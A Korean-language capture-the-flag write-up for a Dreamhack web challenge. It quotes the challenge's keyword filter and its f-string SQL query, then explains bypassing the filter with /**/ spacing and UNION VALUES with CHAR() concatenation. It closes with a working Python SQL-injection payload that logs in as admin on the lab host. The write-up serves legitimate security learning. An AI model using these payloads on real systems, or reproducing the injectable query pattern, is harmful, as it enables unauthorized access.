created: 2026-01-30 17:11
category: #web 
link: https://dreamhack.io/wargame/challenges/1

# Write-up
```python
uid = request.form.get('uid', '').lower()
    upw = request.form.get('upw', '').lower()
    level = request.form.get('level', '9').lower()

    sqli_filter = ['[', ']', ',', 'admin', 'select', '\'', '"', '\t', '\n', '\r', '\x08', '\x09', '\x00', '\x0b', '\x0d', ' ']
    for x in sqli_filter:
        if uid.find(x) != -1:
            return 'No Hack!'
        if upw.find(x) != -1:
            return 'No Hack!'
        if level.find(x) != -1:
            return 'No Hack!'
```
- 문제의 필터링은 위 코드와 같다. 우선 입력 값을 모두 소문자로 변환하므로 대소문자 차이로 우회하는 건 불가능했다.
- 여러가지 필터링 키워드가 있지만 일단 "union", "()", "and", "or", "`*`", "/" 등 여러가지 우회할 수 있는 문자열들이 사용 가능했다. 
	- 공백은 -> `/**/`
- 하지만 `'`와 `"`가 필터링되는데 이거를 어떻게 우회할 수 있을지 감도 잡히지 않았다. 따라서 문자열을 사용하려면 HEX 값이나 이진 값 등을 사용해야 할 것 같았다.

```python
if __name__ == '__main__':
    os.system('rm -rf %s' % DATABASE)
    with app.app_context():
        conn = get_db()
        conn.execute('CREATE TABLE users (uid text, upw text, level integer);')
        conn.execute("INSERT INTO users VALUES ('dream','cometrue', 9);")
        conn.commit()
```
- 테이블 구조와 테이블에 입력된 행을 확인할 수 있었다. 

```python
query = f"SELECT uid FROM users WHERE uid='{uid}' and upw='{upw}' and level={level};"
        try:
            req = conn.execute(query)
            result = req.fetchone()

            if result is not None:
                uid = result[0]
                if uid == 'admin':
                    return FLAG
        except:
            return 'Error!'
```
- 그리고 메인 쿼리 로직이다. 
- 쿼리문을 읽어보면 `uid`와 `upw`는 `'`로 감싸져 있다. 하지만 `level`은 감싸져 있지 않다. (아마도 정수 값이라서 그런듯)
- 따라서 `'` 문자가 필터링되므로 SQL injection은 `level`을 통해서 진행해야 겠다고 판단하였다.
- 쿼리 결과로 `uid`가 "admin"이여야 플래그를 반환한다. 하지만 메인 함수에서 확인한 바로는, 현재 테이블에 "admin" 데이터는 입력되지 않은 상태이다.

예전에 어렴풋이 `UNION` 함수를 통해서 아예 없는 데이터를 생성할 수 있다고 들었던 것 같다. 이와 관련해서 자료를 조사해보았다.
`UNION VALUES(any data)`를 통해서 특정 값을 넣을 수 있는 것을 확인하였다. 따라서 `UNION VALUES('admin')` 쿼리문을 어떻게든 삽입하면 좋겠지만, `'` 문자와 "admin" 문자열은 현재 필터링되고 있는 상황이다. 둘 다 쓰지 않고 "admin" 데이터를 생성하는 방법을 생각해보았다. 

HEX to string이나 binary to string 등 여러가지 방법이 있겠지만, 나는 ASCII to string 방법으로 접근했다. MySQL과 비슷하게 SQLite에도 ASCII 코드 값을 문자로 바꿔주는 `CHAR` 함수가 존재했다. 따라서 해당 함수로 각 문자를 복구하고 `or`를 통해 이어주면 될 것이다. 

최종적인 exploit 코드는 다음과 같다.
```python
import requests

url = "http://host3.dreamhack.games:22941/login"

response = requests.post(
    url,
    data={
        "uid": "test",
        "upw": "test",
        "level": "9/**/UNION/**/VALUES(CHAR(97)||CHAR(100)||CHAR(109)||CHAR(105)||CHAR(110))",
    },
)

print(response.text)
```
실행 이후 정상적으로 플래그를 획득할 수 있었다.

# Reference
- https://hackhyun.tistory.com/295